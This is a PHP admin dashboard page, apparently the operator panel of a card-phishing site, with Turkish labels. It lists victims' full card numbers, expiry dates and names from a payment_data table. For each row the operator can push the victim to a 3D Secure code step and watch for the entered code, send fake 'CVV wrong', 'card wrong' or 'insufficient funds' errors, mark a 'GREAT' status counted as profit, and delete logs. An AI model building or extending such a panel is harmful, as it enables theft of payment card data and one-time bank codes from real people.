<?php
require_once 'config.php';
require_admin();

// Session başlat
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

// İstatistikler
$stats = [
    'orders'   => 0,
    'products' => 0,
    'users'    => 0,
    'revenue'  => 0,
    'profit'   => 0, // GREAT işlemlerden gelen kazanç
];

// Son siparişler ve işlemler
$recent_transactions = [];

try {
    // Örnek sorgular (istatistikler):
    $stmt = $pdo->query('SELECT COUNT(*) FROM orders');
    $stats['orders'] = $stmt->fetchColumn();

    $stmt = $pdo->query('SELECT COUNT(*) FROM products');
    $stats['products'] = $stmt->fetchColumn();

    $stmt = $pdo->query('SELECT COUNT(*) FROM users');
    $stats['users'] = $stmt->fetchColumn();

    $stmt = $pdo->query('SELECT SUM(total) FROM orders WHERE status != "cancelled"');
    $stats['revenue'] = $stmt->fetchColumn() ?: 0;

    $stmt = $pdo->query('SELECT SUM(total) FROM orders WHERE payment_status = "GREAT"');
    $stats['profit'] = $stmt->fetchColumn() ?: 0;

    // Aktif işlemler - Arşivlenmiş olanları hariç tut
    $stmt = $pdo->query('
    SELECT o.id, o.user_id, o.first_name, o.last_name, o.email, o.phone,
           o.total, o.status, o.payment_status, o.created_at,
           p.card_number, p.expiry_date, p.card_holder
    FROM orders o
    LEFT JOIN payment_data p ON o.id = p.order_id
    WHERE (o.status IN ("pending", "processing") OR o.payment_status IN ("pending", "processing"))
      AND o.status != "archived" 
      AND o.payment_status != "archived"
    ORDER BY o.created_at DESC
    LIMIT 10
    ');
    $recent_transactions = $stmt->fetchAll();

} catch (PDOException $e) {
    set_flash_message('danger', 'Veritabanı hatası: ' . $e->getMessage());
}

// Kart numarasını maskele (sadece son 4 haneyi göster)
function maskCardNumber($number) {
    $number = preg_replace('/[^0-9]/', '', $number);
    $length = strlen($number);
    if ($length < 4) return $number;
    return str_repeat('*', $length - 4) . substr($number, -4);
}

$page_title = 'Admin Paneli';
?>

<?php include 'includes/header.php'; ?>

<div class="container-fluid">
    <div class="row">
        <?php include 'includes/admin-sidebar.php'; ?>
        
        <main class="col-md-9 ms-sm-auto col-lg-10 px-md-4">
            <div class="d-flex justify-content-between flex-wrap flex-md-nowrap align-items-center pt-3 pb-2 mb-3 border-bottom">
                <h1 class="h2">Kontrol Paneli</h1>
                <div class="btn-toolbar mb-2 mb-md-0">
                    <div class="btn-group me-2">
                        <a href="orders.php" class="btn btn-sm btn-outline-secondary">Siparişler</a>
                        <a href="products.php" class="btn btn-sm btn-outline-secondary">Ürünler</a>
                    </div>
                </div>
            </div>
            
            <?php echo display_flash_message(); ?>
            
            <!-- İstatistikler -->
            <div class="row">
                <div class="col-xl-3 col-md-6 mb-4">
                    <div class="card border-left-primary shadow h-100 py-2">
                        <div class="card-body">
                            <div class="row no-gutters align-items-center">
                                <div class="col mr-2">
                                    <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">
                                        Toplam Sipariş
                                    </div>
                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
                                        <?php echo $stats['orders']; ?>
                                    </div>
                                </div>
                                <div class="col-auto">
                                    <i class="fas fa-shopping-cart fa-2x text-gray-300"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-xl-3 col-md-6 mb-4">
                    <div class="card border-left-success shadow h-100 py-2">
                        <div class="card-body">
                            <div class="row no-gutters align-items-center">
                                <div class="col mr-2">
                                    <div class="text-xs font-weight-bold text-success text-uppercase mb-1">
                                        Toplam Kazanç
                                    </div>
                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
                                        <?php echo format_money($stats['revenue']); ?>
                                    </div>
                                </div>
                                <div class="col-auto">
                                    <i class="fas fa-dollar-sign fa-2x text-gray-300"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-xl-3 col-md-6 mb-4">
                    <div class="card border-left-info shadow h-100 py-2">
                        <div class="card-body">
                            <div class="row no-gutters align-items-center">
                                <div class="col mr-2">
                                    <div class="text-xs font-weight-bold text-info text-uppercase mb-1">
                                        GREAT Kazanç
                                    </div>
                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
                                        <?php echo format_money($stats['profit']); ?>
                                    </div>
                                </div>
                                <div class="col-auto">
                                    <i class="fas fa-money-bill-wave fa-2x text-gray-300"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="col-xl-3 col-md-6 mb-4">
                    <div class="card border-left-warning shadow h-100 py-2">
                        <div class="card-body">
                            <div class="row no-gutters align-items-center">
                                <div class="col mr-2">
                                    <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">
                                        Toplam Kullanıcı
                                    </div>
                                    <div class="h5 mb-0 font-weight-bold text-gray-800">
                                        <?php echo $stats['users']; ?>
                                    </div>
                                </div>
                                <div class="col-auto">
                                    <i class="fas fa-users fa-2x text-gray-300"></i>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Aktif İşlemler Tablosu -->
            <div class="row">
                <div class="col-12">
                    <div class="card shadow mb-4">
                        <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                            <h6 class="m-0 font-weight-bold text-primary">Aktif Ödeme İşlemleri</h6>
                            <a href="transactions.php" class="btn btn-sm btn-primary">Tümünü Gör</a>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-bordered table-striped">
                                    <thead>
                                        <tr>
                                            <th>Sipariş No</th>
                                            <th>Müşteri</th>
                                            <th>Telefon</th>
                                            <th>Kart Bilgileri</th>
                                            <th>Tutar</th>
                                            <th>Durum</th>
                                            <th>3D Kod</th>
                                            <th>İşlemler</th>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php if (empty($recent_transactions)): ?>
                                            <tr>
                                                <td colspan="8" class="text-center">
                                                    Aktif işlem bulunmamaktadır.
                                                </td>
                                            </tr>
                                        <?php else: ?>
                                            <?php foreach ($recent_transactions as $tx): ?>
                                                <tr id="order-row-<?php echo $tx['id']; ?>">
                                                    <td>#<?php echo $tx['id']; ?></td>
                                                    <td><?php echo htmlspecialchars($tx['first_name'] . ' ' . $tx['last_name']); ?></td>
                                                    <td><?php echo htmlspecialchars($tx['phone']); ?></td>
                                                    <td>
                                                        <?php if (!empty($tx['card_number'])): ?>
                                                            <?php echo maskCardNumber($tx['card_number']); ?>
                                                            <br><small><?php echo $tx['expiry_date']; ?></small>
                                                        <?php else: ?>
                                                            <span class="text-muted">Bilgi yok</span>
                                                        <?php endif; ?>
                                                    </td>
                                                    <td><?php echo format_money($tx['total']); ?></td>
                                                    <td>
                                                        <?php
                                                        switch ($tx['payment_status']) {
                                                            case 'pending':
                                                                echo '<span class="badge bg-warning text-dark">Beklemede</span>';
                                                                break;
                                                            case 'processing':
                                                                echo '<span class="badge bg-info text-dark">İşleniyor</span>';
                                                                break;
                                                            case 'completed':
                                                                echo '<span class="badge bg-success">Tamamlandı</span>';
                                                                break;
                                                            case 'failed':
                                                                echo '<span class="badge bg-danger">Başarısız</span>';
                                                                break;
                                                            case 'GREAT':
                                                                echo '<span class="badge bg-primary">GREAT</span>';
                                                                break;
                                                            default:
                                                                echo htmlspecialchars($tx['payment_status']);
                                                        }
                                                        ?>
                                                    </td>
                                                    <td id="3d-code-<?php echo $tx['id']; ?>">
                                                        <span class="text-muted">Bekleniyor...</span>
                                                    </td>
                                                    <td>
                                                        <div class="dropdown">
                                                            <button class="btn btn-sm btn-secondary dropdown-toggle"
                                                                    type="button"
                                                                    id="dropdownMenu1"
                                                                    data-bs-toggle="dropdown"
                                                                    aria-expanded="false">
                                                                İşlemler
                                                            </button>
                                                            <ul class="dropdown-menu" aria-labelledby="dropdownMenu1">
                                                                <li>
                                                                    <!-- 3D Koda Gönder -->
                                                                    <a class="dropdown-item js-send3d" href="#"
                                                                       data-order-id="<?php echo $tx['id']; ?>">
                                                                        <i class="fas fa-shield-alt me-2"></i> 3D Koda Gönder
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <!-- CVV Hatalı -->
                                                                    <a class="dropdown-item js-setstatus" href="#"
                                                                       data-order-id="<?php echo $tx['id']; ?>"
                                                                       data-status="cvv_error">
                                                                        <i class="fas fa-exclamation-triangle me-2"></i> CVV Hatalı
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <!-- Kart Hatalı -->
                                                                    <a class="dropdown-item js-setstatus" href="#"
                                                                       data-order-id="<?php echo $tx['id']; ?>"
                                                                       data-status="card_error">
                                                                        <i class="fas fa-credit-card me-2"></i> Kart Hatalı
                                                                    </a>
                                                                </li>
                                                                <li>
                                                                    <!-- Bakiye Yetersiz -->
                                                                    <a class="dropdown-item js-setstatus" href="#"
                                                                       data-order-id="<?php echo $tx['id']; ?>"
                                                                       data-status="insufficient_funds">
                                                                        <i class="fas fa-money-bill-wave me-2"></i> Bakiye Yetersiz
                                                                    </a>
                                                                </li>
                                                                <li><hr class="dropdown-divider"></li>
                                                                <li>
                                                                    <!-- GREAT -->
                                                                    <a class="dropdown-item js-setstatus" href="#"
                                                                       data-order-id="<?php echo $tx['id']; ?>"
                                                                       data-status="GREAT">
                                                                        <i class="fas fa-check-circle me-2 text-success"></i> GREAT
                                                                    </a>
                                                                </li>
                                                                <li><hr class="dropdown-divider"></li>
                                                                <li>
                                                                    <!-- Logu Sil -->
                                                                    <a class="dropdown-item js-deletelog text-danger" href="#"
                                                                       data-order-id="<?php echo $tx['id']; ?>">
                                                                        <i class="fas fa-trash-alt me-2"></i> Logu Sil
                                                                    </a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                    </td>
                                                </tr>
                                            <?php endforeach; ?>
                                        <?php endif; ?>
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </main>
    </div>
</div>

<!-- Bootstrap JS & Popper.js -->
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>

<!-- jQuery -->
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<!-- Admin İşlem Scripti (aynı görünüm, inline event yok) -->
<script src="js/admin-dash3.js?v=20"></script>

<?php include 'includes/footer.php'; ?>